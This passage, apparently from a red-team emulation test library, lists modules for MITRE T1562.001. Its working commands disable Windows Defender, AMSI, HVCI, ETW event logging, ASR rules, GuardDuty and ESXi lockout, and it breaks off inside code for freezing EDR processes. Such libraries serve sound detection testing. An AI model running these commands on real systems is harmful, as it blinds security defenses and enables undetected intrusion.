          "check_command": "if (((cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" 2> nul | findstr EnableVirtualizationBasedSecurity 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" 2> nul | findstr RequirePlatformSecurityFeatures 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" 2> nul | findstr Locked 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" 2> nul | findstr Enabled 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" 2> nul | findstr Locked 2> nul\"))) { exit 0 } else { exit 1 }\n",
          "install_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /t REG_DWORD /d 0 /f\n"
        }
      ],
      "rx_module_id": "70bd71e6-eba4-4e00-92f7-617911dbe020",
      "module_name": "Disable Hypervisor-Enforced Code Integrity (HVCI)"
    },
    {
      "index": 1544,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "With administrative rights, an adversary can disable AMSI via registry value in HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.\nThis is currently being used by AsyncRAT and others. \nhttps://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html\nhttps://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f\n",
        "elevation_required": true,
        "cleanup_command": "REG DELETE HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "17538258-5699-4ff1-92d1-5ac9b0dc21f5",
      "module_name": "AMSI Bypass - Override AMSI via COM"
    },
    {
      "index": 1545,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Enables GuardDuty in AWS, upon successful creation this test will suspend and then delete the GuardDuty configuration.\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "bash",
        "command": "detectorId=$(aws guardduty create-detector --enable --region \"#{region}\" | grep -oP '(?<=\"DetectorId\": \")[^\"]*')\naws guardduty update-detector --no-enable --detector-id $detectorId\naws guardduty delete-detector --detector-id $detectorId\n",
        "elevation_required": false,
        "cleanup_command": "echo \"If test successfully ran, no cleanup required.\"\n"
      },
      "variables": [
        {
          "name": "region",
          "description": "Name of the specified region",
          "type": "string",
          "default_value": "us-east-1"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo \"Please install the aws-cli and configure your AWS default profile using: aws configure\"\n"
        }
      ],
      "rx_module_id": "11e65d8d-e7e4-470e-a3ff-82bc56ad938e",
      "module_name": "AWS - GuardDuty Suspension or Deletion"
    },
    {
      "index": 1546,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "With root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo mdatp config real-time-protection --value disabled\n",
        "elevation_required": true,
        "cleanup_command": "sudo mdatp config real-time-protection --value enabled\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "40074085-dbc8-492b-90a3-11bcfc52fda8",
      "module_name": "Tamper with Defender ATP on Linux/MacOS"
    },
    {
      "index": 1547,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Disable Windows Defender by tampering with windows defender registry using the utility \"reg.exe\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"0\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1f6743da-6ecc-4a93-b03f-dc357e4b313f",
      "module_name": "Tamper with Windows Defender Registry - Reg.exe"
    },
    {
      "index": 1548,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Disable Windows Defender by tampering with windows defender registry through powershell\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 1  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 0 \nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 0 \n",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 0  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 1\nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 1 \n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a72cfef8-d252-48b3-b292-635d332625c3",
      "module_name": "Tamper with Windows Defender Registry - Powershell"
    },
    {
      "index": 1549,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "An adversary may disable account lockout policy within ESXi to have the ability to prevent defensive actions from being enforced in the future or to prevent future alerting.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "powershell",
        "command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\nGet-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false\nDisconnect-VIServer -Confirm:$false\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on ESXi Server",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privilege user password on ESXi Server",
          "type": "string",
          "default_value": "pass"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
          "check_command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}\n",
          "install_command": "Install-Module -Name VMware.PowerCLI -Confirm:$false\n"
        }
      ],
      "rx_module_id": "091a6290-cd29-41cb-81ea-b12f133c66cb",
      "module_name": "ESXi - Disable Account Lockout Policy via PowerCLI"
    },
    {
      "index": 1550,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates an InTune-based rules deployment.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$registryPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager\"\n\nif (-not (Test-Path $registryPath)) {\n  New-Item -Path $registryPath -Force\n  Write-Host \"Registry key created: $registryPath\"\n}\n\n$registryValueName = \"ASRRules\"\n\nif (Test-Path \"$registryPath\\$registryValueName\") {\n  Remove-ItemProperty -Path $registryPath -Name $registryValueName\n  Write-Host \"Registry value deleted: $registryValueName\"\n} else {\n  New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value \"36190899-1602-49e8-8b27-eb1d0a1ce869=1\" -Force\n  Write-Host \"Registry value created: $registryValueName\"\n}\n\n\nRemove-ItemProperty -Path $registryPath -Name $registryValueName\nWrite-Host \"Registry value deleted: $registryValueName\"",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "eea0a6c2-84e9-4e8c-a242-ac585d28d0d1",
      "module_name": "Delete Microsoft Defender ASR Rules - InTune"
    },
    {
      "index": 1551,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates a GPO-based rules deployment.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$registryPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR\\Rules\"\n\nif (-not (Test-Path $registryPath)) {\n    New-Item -Path $registryPath -Force\n    Write-Host \"Registry key created: $registryPath\"\n}\n\n$newValueName = \"36190899-1602-49e8-8b27-eb1d0a1ce869\"\n$newValueData = \"1\"\nNew-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force\nWrite-Host \"Registry value created: $newValueName with data $newValueData\"\n\nRemove-ItemProperty -Path $registryPath -Name $newValueName\nWrite-Host \"Registry value deleted: $newValueName\"",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0e7b8a4b-2ca5-4743-a9f9-96051abb6e50",
      "module_name": "Delete Microsoft Defender ASR Rules - GPO"
    },
    {
      "index": 1552,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Threat Actor could disable the AMSI function by adding a registry value name AmsiEnable to the registry key HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable and set its value to 0.\nRef: https://mostafayahiax.medium.com/hunting-for-amsi-bypassing-methods-9886dda0bf9d\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Force | Out-Null\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Name \"AmsiEnable\" -Value 0 -PropertyType DWORD -Force | Out-Null\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Recurse -Force 2> $null\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "728eca7b-0444-4f6f-ac36-437e3d751dc0",
      "module_name": "AMSI Bypass - Create AMSIEnable Reg Key"
    },
    {
      "index": 1553,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "This raglox simulates an activity where an attacker disables the EventLog-Application ETW Auto Logger session using the reg.exe utility to update the Windows registry value \"Start\". This would effectivly disable the Event log application channel. The changes would only take effect after a restart.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\" /v \"Start\" /t REG_DWORD /d \"1\" /f"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "653c6e17-14a2-4849-851d-f1c0cc8ea9ab",
      "module_name": "Disable EventLog-Application Auto Logger Session Via Registry - Cmd"
    },
    {
      "index": 1554,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "This raglox simulates an activity where an attacker disables the EventLog-Application ETW Auto Logger session using the powershell.exe \"New-ItemProperty\" cmdlet to update the Windows registry value \"Start\". This would effectivly disable the Event log application channel. The changes would only take effect after a restart.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application -Name Start -Value 0 -PropertyType \"DWord\" -Force",
        "elevation_required": true,
        "cleanup_command": "New-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application -Name Start -Value 1 -PropertyType \"DWord\" -Force"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "da86f239-9bd3-4e85-92ed-4a94ef111a1c",
      "module_name": "Disable EventLog-Application Auto Logger Session Via Registry - PowerShell"
    },
    {
      "index": 1555,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "This raglox simulates an activity where an attacker disables a specific ETW provider from the EventLog-Application ETW Auto Logger session using the reg.exe utility to update the Windows registry value \"Enabled\". This would effectivly remove that provider from the session and cause to not emit any logs of that type. The changes would only take effect after a restart.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" /v \"Enabled\" /t REG_DWORD /d \"0\" /f",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" /v \"Enabled\" /t REG_DWORD /d \"1\" /f"
      },
      "variables": [
        {
          "name": "ETWProviderGUID",
          "description": "Microsoft-Windows-SenseIR ETW Provider GUID",
          "type": "string",
          "default_value": "{B6D775EF-1436-4FE6-BAD3-9E436319E218}"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1cac9b54-810e-495c-8aac-989e0076583b",
      "module_name": "Disable EventLog-Application ETW Provider Via Registry - Cmd"
    },
    {
      "index": 1556,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "This raglox simulates an activity where an attacker disables a specific ETW provider from the EventLog-Application ETW Auto Logger session using the powershell.exe \"New-ItemProperty\" cmdlet to update the Windows registry value \"Enabled\". This would effectivly remove that provider from the session and cause to not emit any logs of that type. The changes would only take effect after a restart.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" -Name Enabled -Value 0 -PropertyType \"DWord\" -Force",
        "elevation_required": true,
        "cleanup_command": "New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" -Name Enabled -Value 1 -PropertyType \"DWord\" -Force"
      },
      "variables": [
        {
          "name": "ETWProviderGUID",
          "description": "Microsoft-Windows-SenseIR ETW Provider GUID",
          "type": "string",
          "default_value": "{B6D775EF-1436-4FE6-BAD3-9E436319E218}"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8f907648-1ebf-4276-b0f0-e2678ca474f0",
      "module_name": "Disable EventLog-Application ETW Provider Via Registry - PowerShell"
    },
    {
      "index": 1557,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "This test utilizes the tool EDR-Freeze, which leverages the native Microsoft binary WerFaultSecure.exe to suspend processes protected by the Protected Process Light mechanism. PPL is a Windows security feature designed to safeguard critical system processes  such as those related to antivirus, credential protection, and system integrity  from tampering or inspection. These processes operate in a restricted environment that prevents access even from administrators or debugging tools, unless the accessing tool is signed and trusted by Microsoft. By using WerFaultSecure.exe, which is inherently trusted by the operating system, EDR-Freeze is able to bypass these restrictions and temporarily freeze PPL-protected processes for analysis or testing purposes.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Enable SeDebugPrivilege\nAdd-Type -TypeDefinition @\"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class TokenAdjuster {\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);\n\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);\n\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,\n        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);\n\n    [StructLayout(LayoutKind.Sequential, Pack = 1)]\n    public struct TOKEN_PRIVILEGES {\n        public int PrivilegeCount;\n        public long Luid;\n        public int Attributes;\n    }\n\n    public const int SE_PRIVILEGE_ENABLED = 0x00000002;\n    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;\n    public const uint TOKEN_QUERY = 0x0008;\n\n    public static bool EnableSeDebugPrivilege() {\n        IntPtr hToken;\n        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))\n            return 